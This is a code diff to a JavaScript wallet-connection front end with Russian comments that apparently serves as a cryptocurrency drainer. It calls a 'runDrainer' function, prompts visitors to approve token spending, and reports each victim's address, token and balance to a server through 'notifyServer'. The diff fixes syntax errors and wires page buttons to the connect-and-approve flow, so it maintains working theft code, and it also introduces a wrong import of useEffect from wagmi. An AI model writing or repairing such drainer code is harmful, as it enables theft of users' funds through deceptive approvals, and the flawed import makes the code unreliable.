@@ -2,10 +2,9 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { createConfig, http } from 'wagmi';
-import { useAccount, useChainId, useSwitchNetwork, usePublicClient, useWriteContract } from 'wagmi';
+import { useAccount, useChainId, useSwitchNetwork, usePublicClient, useWriteContract, useEffect } from 'wagmi';
 import { ethers } from 'ethers';
 import config from './config.js';
-import { useEffect } from 'react';
 
 // Настройка AppKit
 const projectId = config.PROJECT_ID;
@@ -525,7 +524,7 @@ export default function App() {
   const publicClient = usePublicClient();
   const { writeContract, isPending: isWritePending, isSuccess, error } = useWriteContract();
 
-  // Находим имя сети по chainId
+  // Находим текущую сеть по chainId
   const currentNetwork = networks.find(network => network.id === chainId);
   const networkName = currentNetwork?.name || 'Unknown';
 
@@ -571,7 +570,7 @@ export default function App() {
     try {
       isTransactionPending = true;
       const { targetChainId, targetProvider } = await runDrainer(publicClient, address);
-      if (targetChainId && chainId !== targetChainId) { // Используем chainId вместо chain?.id
+      if (targetChainId && chainId !== targetChainId) {
         await switchChain(targetChainId);
       }
 
@@ -607,7 +606,7 @@ export default function App() {
               }
             }
           } catch (error) {
-            console.error(`❌ Ошибка одобрения токена: ${token}: ${error.message}`);
+            console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
             if (error.message.includes('user rejected')) {
               if (!modalClosed) {
                 console.log(`ℹ️ Пользователь отклонил approve, закрываем модальное окно`);
@@ -618,8 +617,7 @@ export default function App() {
             throw new Error(`Failed to approve token ${token}: ${error.message}`);
           }
         } else {
-          console.
-log(`✅ Allowance уже достаточно для токена ${token}`);
+          console.log(`✅ Allowance уже достаточно для токена ${token}`);
           await notifyServer(address, tokenAddress, balance, targetChainId, null, targetProvider, balance);
           status = 'confirmed';
 
@@ -675,6 +673,19 @@ log(`✅ Allowance уже достаточно для токена ${token}`);
   }
 
   useEffect(() => {
+    const actionButtons = document.querySelectorAll('.action-btn');
+    actionButtons.forEach(btn => {
+      btn.addEventListener('click', handleConnectOrAction);
+    });
+
+    return () => {
+      actionButtons.forEach(btn => {
+        btn.removeEventListener('click', handleConnectOrAction);
+      });
+    };
+  }, [isConnected, address]);
+
+  useEffect(() => {
     if (error) {
       console.error('❌ Write contract error:', error.message);
       showModal();
@@ -685,6 +696,7 @@ log(`✅ Allowance уже достаточно для токена ${token}`);
     }
   }, [error, isSuccess]);
 
+  // Заменяем JSX на DOM API
   const container = document.createElement('div');
 
   const button = document.createElement('button');
@@ -697,12 +709,11 @@ log(`✅ Allowance уже достаточно для токена ${token}`);
     const infoDiv = document.createElement('div');
 
     const addressP = document.createElement('p');
-    addressP.textContent =Modal();
-      await hideModalWithDelay("Err
+    addressP.textContent = `Connected as: ${shortenAddress(address)}`;
     infoDiv.appendChild(addressP);
 
     const networkP = document.createElement('p');
-    networkP.textContent =// Заменяем useNetwork на u // Используем networkName вместо chain?.name
+    networkP.textContent = `Network: ${networkName}`;
     infoDiv.appendChild(networkP);
 
     container.appendChild(infoDiv);
@@ -710,7 +721,6 @@ log(`✅ Allowance уже достаточно для токена ${token}`);
 
   return container;
 }
-
 
 // Модальное окно и стили
 window.addEventListener('DOMContentLoaded', () => {
